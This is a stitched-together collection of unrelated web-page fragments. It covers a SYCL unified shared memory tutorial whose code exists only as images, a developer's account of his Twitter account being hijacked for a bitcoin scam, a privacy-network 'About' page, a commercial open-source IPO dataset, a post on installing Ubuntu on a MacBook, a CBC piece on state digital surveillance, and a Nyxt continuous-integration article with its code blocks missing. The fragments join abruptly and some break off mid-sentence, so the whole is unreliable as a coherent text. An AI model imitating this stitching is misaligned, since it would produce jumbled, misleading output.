<p>The full source code for this example is available in the GitHub repository at <a href="https://github.com/jeffhammond/dpcpp-tutorial" target="_blank" rel="noopener"><strong>https://github.com/jeffhammond/dpcpp-tutorial</strong></a>.</p>
<h2>SYCL 2020 Unified Shared Memory (USM)</h2>
<p>While the program above is perfectly functional and can be implemented across a wide range of platforms, some users will find it rather verbose. Furthermore, it’s not compatible with libraries and frameworks that need to manage memory using pointers. To address this issue with SYCL 1.2.1, Intel developed an extension in DPC++ called Unified Shared Memory (USM) that supports pointer-based memory management.</p>
<p>USM supports two important usage models, both of which will be illustrated below. The first one supports automatic data movement between the host and device. The second one is for explicit data movement to and from device allocations.</p>
<p>The details are in the SYCL 2020 provisional specification, but to get started, all you need to know is below. The <span>q</span> argument is the queue associated with the device where the allocated data will live (either permanently or temporarily):</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-9-1.jpg" alt="" width="1168" height="311" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-9-1.jpg 1168w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-9-1-300x80.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-9-1-1024x273.jpg 1024w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-9-1-768x204.jpg 768w" sizes="(max-width: 1168px) 100vw, 1168px"></p>
<p>If we’re using device allocation, data must be moved explicitly (e.g., using the SYCL <span>memcpy</span> method), which behaves the same way <span>std::memcpy</span> does (e.g., the destination is on the left):</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-10-2.jpg" alt="" width="1195" height="319" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-10-2.jpg 1195w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-10-2-300x80.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-10-2-1024x273.jpg 1024w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-10-2-768x205.jpg 768w" sizes="(max-width: 1195px) 100vw, 1195px"></p>
<p>If we use USM, accessors are no longer required, which means we can simplify the kernel code above to:</p>
<p><img src="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-11-2.jpg" alt="" width="1182" height="220" srcset="https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-11-2.jpg 1182w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-11-2-300x56.jpg 300w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-11-2-1024x191.jpg 1024w, https://simplecore-ger.intel.com/techdecoded/wp-content/uploads/sites/11/code-11-2-768x143.jpg 768w" sizes="(max-width: 1182px) 100vw, 1182px"></p>
<p>You can find the complete working examples of both versions of USM in this repo, named <span>saxpy-usm.cc</span> and <span>saxpy-usm2.cc</span>, respectively.</p>
<h2>SYCL 2020 Terse Syntax</h2>
<p>Finally, in case you’ve been wondering why the opaque handler <span>h</span> was required in each of these programs, it turns out that it isn’t required after all. The following is an equivalent implementation, which was added in the SYCL 2020 provisional specification. Furthermore, we can take advantage of lambda names being optional in the SYCL 2020 provisional specification. Together, these two small changes make SYCL kernels the same length as the original C++ loop listed at the beginning of this tutorial:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>tldr: it’s back now!</p>



<p>At 00:42 in the early morning of November 16 (my time, Central European Time), I received an email saying that “someone” logged into my twitter account <a href="https://twitter.com/bagder">@bagder</a> from a new device. The email said it was done from Stockholm, Sweden and it was “Chrome on Windows”. (I live Stockholm)</p>



<p>I didn’t do it. I don’t normally use Windows and I typically don’t run Chrome. I didn’t react immediately on the email however, as I was debugging curl code at the moment it arrived. Just a few moments later I was forcibly logged out from my twitter sessions (using tweetdeck in my Firefox on Linux and on my phone).</p>



<p>Whoa! What was that? I tried to login again in the browser tab, but Twitter claimed my password was invalid. Huh? Did I perhaps have the wrong password? I selected “restore my password” and then learned that Twitter doesn’t even know about my email anymore (in spite of having emailed me on it just minutes ago).</p>



<p>At 00:50 I reported the issue to Twitter. At 00:51 I replied to their confirmation email and provided them with additional information, such as my phone number I have (had?) associated with my account.</p>



<p>I’ve since followed up with two additional emails to Twitter with further details about this but I have yet to hear something from them. I cannot access my account.</p>



<p><strong>November 17</strong>: (30 hours since it happened). The name of my account changed to Elon Musk (with a few funny unicode letters that only look similar to the Latin letters) and pushed for bitcoin scams.</p>



<p>Also <a href="https://news.ycombinator.com/item?id=25120918">mentioned on hacker news</a> and <a href="https://www.reddit.com/r/programming/comments/jvor6q/daniel_stenbergs_curl_twitter_account_compromised/">reddit</a>.</p>



<p>At 20:56 on November 17 I received the email with the notice the account had been restored back to my email address and ownership.</p>



<p>Left now are the very sad DM responses in my account from desperate and ruined people who cry out for help and mercy from the scammers after they’ve fallen for the scam and lost large sums of money.</p>



<h2>How?</h2>



<p>A lot of people ask me how this was done. The simple answer is that I don’t know. At. All. Maybe I will later on but right now, it all went down as described above and it does not tell how the attacker managed to perform this. Maybe I messed up somewhere? I don’t know and I refuse to speculate without having more information.</p>



<p>I’m convinced I had 2fa enabled on the account, but I’m starting to doubt if perhaps I am mistaking myself?</p>



<h2>Why me?</h2>



<p>Probably because I have a “verified” account (with a blue check-mark) with almost 24.000 followers.</p>



<h2>Other accounts</h2>



<p>I have not found any attacks, take-overs or breaches in any other online accounts and I have no traces of anyone attacking my local computer or other accounts of mine with value. I don’t see any reason to be alarmed to suspect that source code or github project I’m involved with should be “in danger”.</p>

   <p>A digital safe haven providing anonymity against global dragnet surveillance networks</p>
   <h2>About SKYN3T</h2>
   <p>
      Humanity has been contemptuously used by vast digital empires. Thus
      it is now necessary to replace these empires with decentralized networks
      of independent individuals, as in the first decades of the Internet.
      SKYN3T is a place to escape the Orwellian place the mainstream internet
      has now become. They have banned, shadow-banned, throttled, and
      demonetized both users and content based on political considerations,
      exercising their enormous corporate power to influence elections
      globally.
      SKYN3T stands against tyrannical behavior like this and provides a free
      space for all ideas and viewpoints to be heard. We strive towards a more
      decentralized, federated and free internet. We utilize open source
      software for all of our services. SKYN3T always welcomes new users with
      unique ideas and perspectives. We free individuals should be able to
      publish our data freely, without having to answer to any corporation.
      The most reliable guarantee of our privacy, security, and free speech is
      not in the form of any enterprise, organization, or government, but
      instead in the free agreement among free individuals to use common
      standards and protocols.
   </p>

   
   <p>The privacy policy stated here is written to provide complete
      transparency for how SKYN3T handles metadata and anonymization of
      information.</p>

We expect at least 20 more COSS IPOs by the year 2030, in addition to the 16 that have already gone public. </em></blockquote><p>Why do we believe this? One primary reason: The fast growing size of the $100M revenue COSS index (still largely private companies) clearly indicates that many private COSS vendors are ready to go public now!</p><p>Specifically, GitLab, HashiCorp, Odoo, Databricks, Conflent and others. All of these companies have reached at least $100M in revenue and several have achieved $300M+ in ARR.</p><h3 id="data">Data</h3><p>Since the founding of OSS Capital in 2018 and our research going back to 2013, we have strongly believed that COSS companies are fundamentally different and should be recognized as such, as compared to fully proprietary companies. At large, it is clear that many more private market investors are starting to recognize this, too, as evidenced by the notable and recent (over the past 1 year) wave of VC-driven COSS frameworks, blogs, thought pieces and more:</p><ul><li>Andreessen Horowitz: <a href="https://a16z.com/2019/10/04/commercializing-open-source/">https://a16z.com/2019/10/04/commercializing-open-source/</a></li><li>BVP: <a href="https://www.bvp.com/atlas/measuring-the-engagement-of-an-open-source-software-community">https://www.bvp.com/atlas/measuring-the-engagement-of-an-open-source-software-community</a></li><li><a href="https://www.bvp.com/atlas/roadmap-open-source/?from=feature">https://www.bvp.com/atlas/roadmap-open-source/?from=feature</a></li><li>Runa: <a href="https://runacap.com/ross-index/">https://runacap.com/ross-index/</a></li><li>Venrock: <a href="https://ethanjb.medium.com/building-a-commercial-open-source-company-part-1-community-market-fit-3069dcac4ebd">https://ethanjb.medium.com/building-a-commercial-open-source-company-part-1-community-market-fit-3069dcac4ebd</a></li><li>Atomico: <a href="https://medium.com/atomico/atomicos-take-on-open-source-5-reasons-to-build-an-os-company-in-europe-now-6dd443a730b6">https://medium.com/atomico/atomicos-take-on-open-source-5-reasons-to-build-an-os-company-in-europe-now-6dd443a730b6</a></li><li>GGV: <a href="https://www.forbes.com/sites/glennsolomon/2020/10/13/finding-trillions-in-the-clouds-how-open-source-companies-can-win-in-a-world-dominated-by-amazon-microsoft-and-google/?sh=7cde0d5b688f">https://www.forbes.com/sites/glennsolomon/2020/10/13/finding-trillions-in-the-clouds-how-open-source-companies-can-win-in-a-world-dominated-by-amazon-microsoft-and-google/?sh=7cde0d5b688f</a></li><li>Accel: <a href="https://www.accel.com/noteworthy/the-future-of-open-source-launching-the-open100">https://www.accel.com/noteworthy/the-future-of-open-source-launching-the-open100</a></li><li>5Y Capital: <a href="https://github.com/chenzhepeter/ChinaCOSS">https://github.com/chenzhepeter/ChinaCOSS</a> </li></ul><p>Here are the data points covered in the COSS IPO Dataset which will provide the basis for extensive analysis in subsequent writing and blogs from here:</p><ul><li>COSS Company</li><li>FOSS Core: The Open-Source technology that the COSS company is based on.</li><li>S-1s: Links to the red herring filings for each company.</li><li>Ticker: Acronym for the public listing when public.</li><li>Current or Last Exit Valuation (B): Many of the 16 COSS companies who have gone public were subsequently acquired and continue to grow inside larger parent organizations (e.g. MuleSoft to Salesforce, Sourcefire to Cisco, etc)</li><li>IPO raise (M): How much capital was raised during the IPO?</li><li>IPO Date: When did the company IPO?</li><li>Status: Still public, or acquired?</li><li>Listed Price</li><li>Current Price</li><li>Age of company at IPO (years)</li><li>Age of FOSS core at IPO (years)</li><li>Employees at IPO</li><li>Current Employees</li><li>Financial Metrics (We will add more over time):</li><li>Revenue at IPO</li><li>Burn Rate at IPO</li><li>Stock comp</li><li>Deferred revenue</li><li>Adjusted burn</li><li>Burn as % of revenue</li><li>MV at IPO (M)</li><li>Growth	MV/revenue</li><li>Top 3 equity owners at IPO</li><li>FOSS emphasis / highlights in S-1: How much did the S-1 filing discuss Open-Source or highlight the FOSS core as a key part of the COSS company strategy, positioning, etc?</li></ul>

While I tried different laptops, I never really got the same feeling of attachment that I have to my model 2015 MacBook Pro. It turns out, I like and respect older Apple hardware.

Sometimes, even intentionally hampering what one could tinker around within the name of “safety and integrity protection”.</p><p>In my view, 2015 was the last year any robust and sustainable laptops came out of there. You don’t have to agree with me.</p><p>So, I ran around looking for other options. An obvious choice would have been running Windows 10 on Bootcamp and trying to get my Linux experience with the WSL2. I am sure that it would have worked fine. But again, we are speaking about slightly older hardware here that we still want to use for writing software. Running Linux inside a VM, even as lightweight as the WSL2 was not an option, I’d be happy with. There was only one other option to get the Linux experience I wanted …</p><h2 id="running-linux-on-a-mac-does-that-even-work">Running Linux on a Mac? Does that even work?</h2><p>It does better than I and probably many of you would have expected. Both visually and under the hood, I am getting more out of the hardware than Catalina (ugh), or possibly, Big Sur would have managed to squeeze. If you use apps that have support or alternatives on other platforms and choose to go for a no-brainer distribution like Ubuntu, you won’t feel a difference in your end experience at all. Ubuntu’s default GUI is modern and snappy. Some even claim that Big Sur looks a lot more like Gnome or KDE than any previous version of macOS. Of course, Linux being open, if the default environment feels heavy for your hardware, one can always choose one from the myriads of other GUI options available on the Linux Universe.</p><h2 id="what-about-the-installation-process">What about the installation process?</h2><p>In my case, the installation was super smooth as well. I baked an Ubuntu image on a Micro SD card (works too, if you don’t have a USB stick) using <a href="https://www.balena.io/etcher/">balenaEtcher</a>. Before the installation, one has the option to try Ubuntu live by directly booting off the Micro SD (or USB stick). Simply,press Alt during boot, wait a few seconds and choose “EFI Boot” from the available options. I highly recommend to anyone to spend as much time as possible playing around before installing. I had written down a huge checklist of things I wanted to make sure I check before I even go and prepare my SSD for the installation. Make sure you have tested your WiFi, sound, Bluetooth, etc. I was lucky enough that my WiFi worked out of the box, but this might not be the case with other Macs. A working Internet connection is very important during the installation, so if your WiFi doesn’t happen to work, make sure you grab an Ethernet cable (and a USB-to-Ethernet adapter if necessary) before you move on.</p><p>I will be brief about the rest of the process since everything is explained in detail in the guide I followed:</p><figure><blockquote><a href="https://linuxnewbieguide.org/how-to-install-linux-on-a-macintosh-computer/">How to install Linux on a Macintosh and dual boot with macOS</a></blockquote>
</figure><p><br>If you only have 256 GB SSD or less and want to keep your existing macOS available, be prepared for a lot of space freeing and partitioning your drive. I freed up 100 GB for Ubuntu and left some 4 GB for a swap partition. I intend to be able to reduce my macOS partition even further, eventually increasing the size of my Linux storage.</p><p>Once partitions were in place, installation and booting from Linux were no problem at all. In case they happen to be, the guide above explains how to set up a more advanced boot loader.</p><h2 id="what-i-am-still-struggling-with">What I am still struggling with</h2><p>Surprisingly little. Bigger things are the sound coming out of the audio jack (though speakers work perfectly), and maintaining proper scaling across my laptop’s screen and my external monitor. The latter one is more of a general issue on pretty much all OSes. I was positively surprised that Ubuntu picked up the native resolutions of both displays, so my picture was crystal sharp, albeit very small,and required adjusting some scaling. More minor issues include not being able to scroll with my Magic Mouse, and of course, having to learn to use Ctrl instead of Cmd for pretty much all things. I am sure though that given time, I will find appropriate solutions for all those things. None of them bothers me nearly enough to make me switch back.</p><p>I will try to report more on my experience after some time has passed. For now, I am more than happy.</p></div>

And as Deibert explains in his fourth Massey Lecture, a lot has changed in the years following the social media uprising.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5797286.1605041141!/cpImage/httpImage/image.jpg_gen/derivatives/original_300/egypt-tahrir-antiquities.jpg 300w,https://i.cbc.ca/1.5797286.1605041141!/cpImage/httpImage/image.jpg_gen/derivatives/original_460/egypt-tahrir-antiquities.jpg 460w,https://i.cbc.ca/1.5797286.1605041141!/cpImage/httpImage/image.jpg_gen/derivatives/original_620/egypt-tahrir-antiquities.jpg 620w,https://i.cbc.ca/1.5797286.1605041141!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/egypt-tahrir-antiquities.jpg 780w,https://i.cbc.ca/1.5797286.1605041141!/cpImage/httpImage/image.jpg_gen/derivatives/original_1180/egypt-tahrir-antiquities.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5797286.1605041141!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/egypt-tahrir-antiquities.jpg"></p></div><figcaption>Anti-government protesters in Cairo's Tahrir Square, February 2011.

Unfortunately, it wasn't just political underdogs and freedom fighters who recognized the immense power of these revolutionary new tools.</p>  <p>The great lesson of the Arab Spring, says John Naughton, a professor of the public understanding of technology at the Open University in the U.K., "is that autocrats actually are better at using this allegedly democratizing technology than democratic regimes."</p>  <p><span><span><div><div title="I was the target of an international mercenary spy operation" role="button" tabindex="0"><div><div aria-labelledby="1818831427614-metadata-" title="I was the target of an international mercenary spy operation"><div><p><img src="https://thumbnails.cbc.ca/maven_legacy/thumbnails/941/839/THTM5_Ep2_JSR_Still002.jpg" alt="" loading="lazy"></p></div></div></div></div></div><span>When John Scott-Railton, a researcher at Citizen Lab, was contacted by someone claiming to be interested in his work, he was immediately suspicious. He decided to play along and found himself in a game of spy versus spy.<!-- --> <!-- -->7:59</span></span></span></p>  <p>Naughton, author of <em>From Gutenberg to Zuckerberg: What You Really Need to Know About the Internet</em>, explains that the same technologies that had been used for public uprisings against oppressive governments are now being used by those governments against political&nbsp;demonstrators, whistleblowers and dissidents.</p>  <p>"In that sense," Naughton says, "the technology has turned on us. We thought that it was always going to be liberating and democratizing. And sometimes, it's actually enslaving."</p>  <h2>Big Brother territory&nbsp;</h2>  <p>Nearly a decade after what had been called "Twitter revolution," we find ourselves in Big Brother territory, says Glenny, remarking at the extraordinary speed with which <a href="http://www.theatlantic.com/international/archive/2013/06/actually-most-countries-are-increasingly-spying-on-their-citizens-the-un-says/276614/" target="_blank">intelligence agencies and militaries in particular have appropriated these tools</a>. "Now most countries are using data from their citizens to monitor, to see what they're up to."</p>    <p>While such Orwellian envisioning was long seen as futuristic, "we're now moving into a technological environment where the complete surveillance of all citizens, of all populace, of all people, and of all things is increasingly possible," says Daniel Deudney, a professor of political science and international relations at Johns Hopkins University.</p>  <p>So how did it come to be it that the very tools meant to empower individuals were so swiftly seized by the powers that sought to maintain control?</p>  <p>It did not take long for authoritarian regimes and security agencies "to realize just how useful it is to have their adversaries plugged in, networked, and online communicating," says Deibert.</p>  <p>As he explains, the technologies used to organize grassroots uprisings, such as smartphones and social media platforms — consumer products made by technology companies for whom security is often an afterthought — just served to supercharge "the dictator's totalizing gaze and iron grip," which have now become borderless as well.</p>    <p>Government agencies can now easily keep tabs on individuals, no matter where they are. They can ascertain who their friends and family members are, track their movements, and see their plans unfold in real time, "from the very device they hold in their hands, and that they carry with them as they go about their daily business," explains Deibert.</p>  <p>Saudi Arabia, for example, "has aggressively pursued extensive social media manipulation, digital subversion, and cyber-espionage," he says. And while some of it has been directed at regional rivals, "the bulk of it is intended to thwart political opposition and dissent," ranging from political opposition, to criticism of the crown prince, to the assertion of women's rights.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5234101.1597455666!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/1052814206.jpg 300w,https://i.cbc.ca/1.5234101.1597455666!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/1052814206.jpg 460w,https://i.cbc.ca/1.5234101.1597455666!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/1052814206.jpg 620w,https://i.cbc.ca/1.5234101.1597455666!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1052814206.jpg 780w,https://i.cbc.ca/1.5234101.1597455666!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/1052814206.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5234101.1597455666!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/1052814206.jpg"></p></div><figcaption>The government of Saudi Arabia's Crown Prince Mohammed bin Salman, seen here in 2018, has been accused of using social media manipulation and cyber-espionage to 'thwart political opposition and dissent,' says Deibert.<!-- --> <!-- -->(Fayez Nureldine/AFP)</figcaption></figure></span></p>  <p>The troubling irony is that while we may perceive our devices and social media accounts as our windows to the world, says Deibert, "the flow of communications over the internet works in both directions." Indeed, those devices and accounts are also a window into our lives for those on the outside looking in.</p>  <p>"Far from being the existential threat that many observers of the Arab Spring assumed, social media have turned out to be a dictator's best friend," says Deibert.</p>  <h2>From authoritarian regimes to established&nbsp;democracies</h2>  <p>Perhaps more disturbing yet is the fact that these tactics are being used not only to monitor dissidents, but to keep entire societies in check. In China, "information controls have evolved far beyond mere defensive measures to more proactive uses of social media for large-scale social and economic engineering," says Deibert.</p>  <p>The so-called "social credit system" is an all-encompassing initiative to draw on data from across the internet, as well as information captured by an estimated 200 million cameras across the country, to track and evaluate individuals for their "trustworthiness" and root out "uncivilized behaviour," which Deibert notes, includes wearing pyjamas in public or jaywalking.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.4778165.1533759023!/cpImage/httpImage/image.jpg_gen/derivatives/original_300/china-uighur-protest.jpg 300w,https://i.cbc.ca/1.4778165.1533759023!/cpImage/httpImage/image.jpg_gen/derivatives/original_460/china-uighur-protest.jpg 460w,https://i.cbc.ca/1.4778165.1533759023!/cpImage/httpImage/image.jpg_gen/derivatives/original_620/china-uighur-protest.jpg 620w,https://i.cbc.ca/1.4778165.1533759023!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/china-uighur-protest.jpg 780w,https://i.cbc.ca/1.4778165.1533759023!/cpImage/httpImage/image.jpg_gen/derivatives/original_1180/china-uighur-protest.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.4778165.1533759023!/cpImage/httpImage/image.jpg_gen/derivatives/original_780/china-uighur-protest.jpg"></p></div><figcaption>Activists around the world have held demonstrations protesting China's use of artificial intelligence and data collection to implement a social credit system.<!-- --> <!-- -->(Seth Wenig/Associated Press)</figcaption></figure></span></p>  <p>"High-resolution digital surveillance cameras are omnipresent, scattered throughout our cities," says Deibert, and "layered underneath those fixed cameras are the billions of consumer devices that nearly everyone carries with them at all times, the standard features of which include a built-in digital camera. Multiplying the effects is a widespread 'selfie' culture of auto-surveillance, in which digital images of people's faces are frequently snapped and then shared on social media platforms with a mere click."</p>  <p>As the images are digitized, they can be easily converted into a matrix of data points that algorithms and artificial intelligence systems can sift through and sort. Tools that harness this unprecedented collection of biometric data are already available, and have, as<a href="https://www.nytimes.com/2020/01/18/technology/clearview-privacy-facial-recognition.html"> journalist Kashmir Hill noted in the New York Times</a>, the power to "end privacy as we know it."&nbsp;</p>  <p>While China and Saudi Arabia are notable examples of how new technologies are enabling "digital authoritarianism" to flourish, Deibert warns, "it would be a mistake to conclude that the effects of social media are limited to a group of bad actors 'over there.'" Indeed, some have argued&nbsp;<a href="https://www.nytimes.com/2020/10/07/opinion/trump-russia-election-interference.html">the greatest threat to the recent U.S. election was not Russian interference</a>, but came from within the White House.

<p>In this article we are going to talk continuous testing and packaging in Common Lisp. The goal is to automate:</p>
<ul>
<li><p>Report coding errors on every push, including pull requests. This prevents unseen, long-standing breakages, and also helps with pull requests since the system will automatically report failing tests, compilation warnings, etc.</p></li>
<li><p>Ease the release process by automating package builds. This allows us to release often with a higher level of guarantees.</p></li>
</ul>
<p>Since Nyxt is currently hosted on GitHub, we are leveraging GitHub Actions for our continuous integration. Even though we are using GitHub Actions, we've designed our process to be platform independent. As a result, our GitHub-specific code remains small and trivial.</p>

<p>Some Common Lisp compilers are particularly good at code analysis:</p>
<ul>
<li><p>No false positives, all warnings are meaningful.</p></li>
<li><p>They catch many errors at compile time, including typing errors.</p></li>
</ul>
<p><a href="http://www.sbcl.org/">SBCL</a> and <a href="https://ccl.clozure.com/">CCL</a> are two high-quality compilers that fit the bill. While only SBCL is officially supported to build Nyxt, CCL proves useful in catching some error and warning classes that SBCL misses. In particular, CCL is better at type-checking class slots.</p>
<p>Let's review what we want to automate to increase our quality assurance:</p>
<ul>
<li><p>Build: The project compiles with all compilers.</p></li>
<li><p>Testing: All test suites pass with all compilers.</p></li>
<li><p>Code checking: No warnings are reported with any compiler.</p></li>
</ul>
<p>In practice, the last two points suffice since the code checking is done by building the project.</p>
<p>Allow me to emphasize the importance of code checking: since the compilers don't report false positives, this forces us to have warning-free code at all time, which is a big boost for quality assurance!</p>
<h2 id="automatic-build">Automatic build</h2>
<p>First we need to set up the GitHub action in this <a href="https://github.com/atlas-engineer/nyxt/blob/2-pre-release-4/.github/workflows/tests.yml">YAML file</a>.</p>
<p>In short:</p>
<ul>
<li><p>We install the Nyxt dependencies using the image package manager, here APT.</p></li>
<li><p>Then we install <a href="https://github.com/roswell/roswell">Roswell</a>, a tool that will allow us to easily install the desired Common Lisp compilers since the host system package managers may not have them. Roswell includes <a href="https://www.quicklisp.org/beta/">Quicklisp</a>, so we will leverage this to install all the Common Lisp dependencies of Nyxt.</p></li>
<li><p>Some dependencies are missing from Quicklisp, so we fetch them via our Makefile dedicated rule, then register their location as per the <a href="https://common-lisp.net/project/asdf/asdf/Configuration-DSL.html#Configuration-DSL">ASDF API</a>.</p></li>
</ul>
<h2 id="automatic-testing">Automatic testing</h2>
<p>Finally, we run the following:</p>

<p>We load the tests which builds Nyxt itself. If the Nyxt build fails, the error is reported as part of the workflow.</p>
<p>We exit with a custom non-zero error code, here 17. This can help identify the cause of the error in case the output gets confusing.</p>
<p>The rest of the test controls happens in the <a href="https://github.com/atlas-engineer/nyxt/blob/2-pre-release-4/nyxt.asd">nyxt.asd</a> file. Our main <code>:nyxt</code> system lists all the tests so that call <code>(asdf:test-system :nyxt)</code> effectively runs the whole test suite.</p>
<p>Each individual test system is specified in the following form:</p>

<p>We've rolled out our own helper function <code>nyxt-run-test</code> to factor some recurring code.</p>

<p>We've added some knobs that we can control externally:</p>
<ul>
<li><p>If the <code>NYXT_TESTS_NO_NETWORK</code> environment variable is set, the test is not run. This is useful to disable tests require a network connection. Some build systems (like Guix) disable network connectivity during builds.</p></li>
<li><p>If <code>NXYT_TESTS_ERROR_ON_FAIL</code> is set, the process will exit with a non-zero error code, which will cause the build system, or the integration pipeline to fail and report. This is necessary because otherwise the ASDF test operation does not "fail" in the sense that the process returns the 0 error code by default.</p>
<p>In the YAML file, we set this variable to <code>yes</code>, thus externally commanding our test suite to reflect its error on the pipeline.</p></li>
</ul>
<h2 id="automatic-code-checking">Automatic code checking</h2>
<p>Finally, our last step in our YAML file is very simple: it loads a file and executes the <code>compilation-conditions</code> function on systems we want to test, here <code>nyxt</code> and the renderers.</p>
<p>Let's look at <a href="https://github.com/atlas-engineer/nyxt/blob/2-pre-release-4/build-scripts/report-warnings.lisp">this file</a> more closely:</p>
<ul>
<li><p>First <code>compilation-conditions</code> calls <code>load-system-silently</code> on the recursive dependencies of the system as returned by <code>list-dependencies</code>.</p>
<p>We do this to <em>pre-compile</em> the Nyxt dependencies, thus ensuring that when we compile Nyxt the compiler only reports warnings related to Nyxt and not its dependencies.</p>
<p><code>load-system-silently</code> is like ASDF's <code>load-system</code> but muffles the output to keep the pipeline output shorter.</p></li>
<li><p>An amazing feature of Common Lisp is that the <code>compile</code> function is built into the language, which allows us to control the compilation process in Common Lisp itself!</p>
<p>Thus we collect all conditions that are not redefinitions:</p>

<p>Thanks to <a href="https://old.reddit.com/r/Common_Lisp/comments/jadiv0/how_can_i_report_compilation_warnings_in_ci/g8s5oj4/"><span data-cites="phoe">@phoe</span></a> for this tip!</p>
<p>Note to the attentive reader: <code>redefinition-p</code> is not the proper way to check if a condition is a redefinition. The redefinition condition type is not portable, so the code should be different between SBCL and CCL, but it turns out that this "hack" works in our case.</p></li>
<li><p>Finally, we report the conditions to the standard output (which will display in the continuous testing web interface) and return a custom non-zero error code.</p></li>
</ul>

<p>Since none of us at Atlas are using a Debian-based distribution such as Ubuntu, and since these distributions are among the most popular platforms, it has become increasingly necessary to automate the process of distributing a pre-built <code>.deb</code> package</p>
<p>Automating packaging is no simple task, for this we leverage the <a href="https://gitlab.com/ralt/linux-packaging">linux-packaging</a> Common Lisp library, which itself is based on <a href="https://github.com/jordansissel/fpm">fpm</a>.</p>
<p>Beside wrapping <code>fpm</code>, <code>linux-packaging</code> automatically guesses the operating system dependencies for the FFI libraries and statically links the FFI-generated objects into the Lisp image. No more problem distributing <a href="http://www.common-lisp.net/project/osicat/">Osicat</a>!</p>
<p>As for continuous testing, we have a <a href="https://github.com/atlas-engineer/nyxt/blob/2-pre-release-4/.github/workflows/package-ubuntu.yml">YAML file</a> which has roughly the same steps except that we don't leverage Roswell here because we are going to build our own SBCL compiler: indeed, <code>linux-packaging</code> requires SBCL to be built with the non-default <code>--with-sb-linkable-runtime</code> option.</p>
<p>Notice the new dependency line:</p>

<p>Ruby is required for <code>fpm</code> and SBCL for… rebuilding SBCL!</p>
<p>Not much here since everything happens in the <a href="https://github.com/atlas-engineer/nyxt/blob/2-pre-release-4/build-scripts/build-ubuntu-package.sh">build-ubuntu-package.sh</a> script:</p>
<ul>
<li>We first install <code>fpm</code>.</li>
<li>Then we build <code>SBCL</code> with the <code>--with-sb-linkable-runtime
 --with-sb-dynamic-core</code> options.</li>
<li>We install Quicklisp manually since this time we don't have Roswell.</li>
<li>We install <code>linux-packaging</code>.</li>
<li>Pitfall: We install a modern version of ASDF since <code>linux-packaging</code> requires a version that's more recent than the one shipped with SBCL (at least as of 2.0.10).</li>
<li>As for continuous testing, we register the current directory in the ASDF registry so that it finds the Nyxt ASDF systems.</li>
</ul>
<p>Finally, the package build happens in the last command:</p>

<p><code>quickload</code> will drag all <code>linux-packaging</code> and <code>nyxt</code> dependencies. Then we load and make an ASDF system that's dedicated to the creation of the package.</p>
<p>This system is declared in a <a href="https://github.com/atlas-engineer/nyxt/blob/2-pre-release-4/nyxt-ubuntu-package.asd">separate file</a> because otherwise it would make Nyxt depend on <code>linux-packaging</code>, which the end user does not need.</p>
<p>Let's review it:</p>

<p>Here we declare that loading this system will trigger the <code>linux-packaging:build-op</code> operation which will generate a <code>linux-packaging:deb</code> package.</p>
<p>Notice that there is only one knob to control the type of package we want to produce. It's enough to change this value to <code>linux-packaging:rpm</code> to produce an RPM!</p>

<p>Here we list the Common Lisp systems we want to include in our image. Since <code>nyxt/gtk</code> depends on everything else, it's the only system that we need to list.</p>
<p>The <code>:entry-point</code> is the same we use to build Nyxt from the <code>Makefile</code>.</p>

<p>Here we list all the metadata for the <code>.deb</code>. Since we decided to store this system in a separate <code>.asd</code> file, it can't automatically inherit from the metadata of the <code>nyxt</code> system. So we need to use a reader macro to explicitly tell ASDF to look for the metadata of Nyxt.</p>

<p>The attentive reader may have noticed that I said that <code>linux-packaging</code> automatically derived the operating system dependencies for FFI packages. Indeed, we don't need to declare that WebKitGTK is a dependency here for instance.</p>
<p>However, some of our code has optional dependencies. While WebKitGTK would work without <code>glib-networking</code> it would have limited functionality, like no HTTPS support.</p>
<p>Other dependencies include those that are typically used by Common Lisp libraries that depend on executables, like <a href="https://github.com/snmsts/trivial-clipboard">trivial-clipboard</a> which depends on an external clipboard program like <code>xclip</code>.</p>

<p>Finally, we list all the assets to include in the <code>.deb</code>: icons, <code>.desktop</code> file, etc.</p>
<p>The <code>build-pathname</code> field is the name of the produced executable which will be automatically stored to <code>/usr/bin</code> in the package.</p>

<ul>
<li><p>Guix test and packaging</p>
